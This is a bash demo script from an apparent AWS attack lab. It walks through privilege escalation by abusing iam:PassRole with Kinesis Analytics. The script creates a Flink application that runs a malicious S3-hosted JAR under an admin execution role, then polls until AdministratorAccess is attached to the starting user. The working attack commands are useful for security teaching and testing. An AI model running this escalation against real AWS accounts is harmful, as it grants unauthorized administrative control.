#!/bin/bash

# Demo script for iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication privilege escalation
# This scenario demonstrates how a user with PassRole, CreateApplication, and StartApplication permissions
# can create a Managed Apache Flink application referencing a malicious JAR in S3 that runs
# with an admin service execution role, which attaches AdministratorAccess to the starting user.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-kinesisanalytics-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-kinesisanalytics-001-to-admin-admin-role"
APP_NAME="pl-prod-kinesisanalytics-001-to-admin-app"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Kinesis Analytics CreateApplication + StartApplication Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_kinesisanalytics_001_iam_passrole_kinesisanalytics_createapplication_kinesisanalytics_startapplication.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and S3 info from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
CODE_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.code_bucket_name')
CODE_BUCKET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.code_bucket_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Code S3 Bucket: $CODE_BUCKET_NAME"
echo "Code S3 Key: $CODE_BUCKET_KEY"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID (using readonly creds)
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Verify malicious Flink application JAR in S3
echo -e "${YELLOW}Step 5: Verifying malicious Flink application JAR in S3${NC}"
echo "A pre-built Apache Flink DataStream application JAR has been uploaded to S3 by Terraform."
echo "The JAR uses the service execution role's credentials to attach AdministratorAccess to the starting user."
echo ""
echo "Source code: exploit-jar/src/main/java/com/exploit/EscalationJob.java"
echo "To rebuild: cd exploit-jar && ./build.sh (requires Docker)"
echo "S3 Location: s3://$CODE_BUCKET_NAME/$CODE_BUCKET_KEY"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The exploit JAR is hosted in an attacker-controlled S3 bucket. The bucket policy${NC}"
echo -e "${BLUE}  grants the prod account read access (not via IAM, but via resource policy).${NC}"
echo -e "${BLUE}  If an attacker account is configured, this bucket lives in a separate AWS account.${NC}"
echo ""
echo -e "${GREEN}✓ Exploit JAR is available in S3${NC}\n"

# Step 6: Create the Managed Apache Flink application referencing S3 code
use_starting_creds
echo -e "${YELLOW}Step 6: Creating Managed Apache Flink application with S3-hosted malicious code${NC}"
echo "Application name: $APP_NAME"
echo "Runtime: FLINK-1_19"
echo "Code location: s3://$CODE_BUCKET_NAME/$CODE_BUCKET_KEY"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

# Build the application configuration JSON using S3ContentLocation
cat > /tmp/kinesisanalytics-001-app-config.json << CONFIGEOF
{
    "ApplicationName": "$APP_NAME",
    "RuntimeEnvironment": "FLINK-1_19",
    "ServiceExecutionRole": "$ADMIN_ROLE_ARN",
    "ApplicationConfiguration": {
        "ApplicationCodeConfiguration": {
            "CodeContent": {
                "S3ContentLocation": {
                    "BucketARN": "arn:aws:s3:::$CODE_BUCKET_NAME",
                    "FileKey": "$CODE_BUCKET_KEY"
                }
            },
            "CodeContentType": "ZIPFILE"
        },
        "FlinkApplicationConfiguration": {
            "ParallelismConfiguration": {
                "ConfigurationType": "CUSTOM",
                "Parallelism": 1,
                "ParallelismPerKPU": 1
            }
        }
    }
}
CONFIGEOF

show_attack_cmd "Attacker" "aws kinesisanalyticsv2 create-application --region $AWS_REGION --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json"
APP_RESULT=$(aws kinesisanalyticsv2 create-application \
    --region $AWS_REGION \
    --cli-input-json file:///tmp/kinesisanalytics-001-app-config.json \
    --output json 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create Flink application${NC}"
    echo "$APP_RESULT"
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi

APP_ARN=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationARN')
APP_VERSION=$(echo "$APP_RESULT" | jq -r '.ApplicationDetail.ApplicationVersionId')
echo "Application ARN: $APP_ARN"
echo "Application Version: $APP_VERSION"
echo -e "${GREEN}Flink application created${NC}\n"

# Step 7: Start the Flink application
echo -e "${YELLOW}Step 7: Starting the Flink application (privilege escalation trigger)${NC}"
echo "This is the privilege escalation vector - the application starts with the admin"
echo "service execution role and runs our malicious code which calls iam:AttachUserPolicy."

show_attack_cmd "Attacker" "aws kinesisanalyticsv2 start-application --region $AWS_REGION --application-name $APP_NAME"
START_RESULT=$(aws kinesisanalyticsv2 start-application \
    --region $AWS_REGION \
    --application-name "$APP_NAME" 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to start Flink application${NC}"
    echo "$START_RESULT"
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi

echo -e "${GREEN}✓ Flink application start initiated${NC}\n"

# [OBSERVATION]
# Step 8: Wait for application to reach RUNNING state and for privilege escalation
use_readonly_creds
echo -e "${YELLOW}Step 8: Waiting for Flink application to run and escalate privileges${NC}"
echo "The application needs 2-5 minutes to start up. Once running, the malicious code"
echo "executes immediately to attach AdministratorAccess to the starting user."
echo "Polling application status and checking for escalation..."
echo ""

MAX_WAIT=600  # 10 minutes
ELAPSED=0
ESCALATION_SUCCEEDED=false

while [ $ELAPSED -lt $MAX_WAIT ]; do
    MINUTES_ELAPSED=$((ELAPSED / 60))
    SECONDS_REMAINING=$((ELAPSED % 60))

    # Check application status
    show_cmd "ReadOnly" "aws kinesisanalyticsv2 describe-application --region $AWS_REGION --application-name $APP_NAME --query 'ApplicationDetail.ApplicationStatus' --output text"
    APP_STATUS=$(aws kinesisanalyticsv2 describe-application \
        --region $AWS_REGION \
        --application-name "$APP_NAME" \
        --query 'ApplicationDetail.ApplicationStatus' \
        --output text 2>/dev/null)

    echo "[${MINUTES_ELAPSED}m ${SECONDS_REMAINING}s] Application status: $APP_STATUS"

    # Check if AdministratorAccess has been attached to starting user
    ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
        --output text 2>/dev/null)

    if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
        echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
        ESCALATION_SUCCEEDED=true
        break
    fi

    # If application failed, the exploit failed
    if [ "$APP_STATUS" == "READY" ] && [ $ELAPSED -gt 60 ]; then
        # Application reverted to READY - means it failed to start properly
        echo -e "${RED}Application reverted to READY state - the job may have failed${NC}"
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
    echo -e "${RED}Error: Privilege escalation did not succeed within 10 minutes${NC}"
    echo "Application status: $APP_STATUS"
    echo "The Flink application may have failed to execute the exploit."
    echo "Check CloudWatch Logs for application output."
    rm -f /tmp/kinesisanalytics-001-app-config.json
    exit 1
fi
echo ""

# Step 9: Verify admin access
echo -e "${YELLOW}Step 9: Verifying privilege escalation success${NC}"

# Wait for IAM propagation
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15

# [OBSERVATION]
# Check attached policies using readonly creds
use_readonly_creds
echo "Checking attached policies on starting user..."
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
echo "$ATTACHED_POLICIES"
echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
echo ""

# Verify actual admin access
echo "Attempting to list IAM users..."
show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
fi
echo ""

# Clean up temporary files
rm -f /tmp/kinesisanalytics-001-app-config.json

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, kinesisanalytics:CreateApplication, kinesisanalytics:StartApplication)"
echo "2. Built a malicious Apache Flink JAR that calls iam:AttachUserPolicy"
echo "3. Created Managed Apache Flink application referencing malicious JAR in S3"
echo "4. Started the application, passing $ADMIN_ROLE_NAME as the service execution role"
echo "5. Flink app used admin role credentials to attach AdministratorAccess to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  -> (kinesisanalytics:CreateApplication with S3 code) -> Flink app with malicious JAR"
echo "  -> (iam:PassRole + kinesisanalytics:StartApplication with $ADMIN_ROLE_NAME)"
echo "  -> Flink job calls iam:AttachUserPolicy -> Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Managed Apache Flink Application: $APP_NAME"
echo "- Application ARN: $APP_ARN"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The Flink application is still running and may incur charges${NC}"
echo -e "${RED}⚠ AdministratorAccess is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
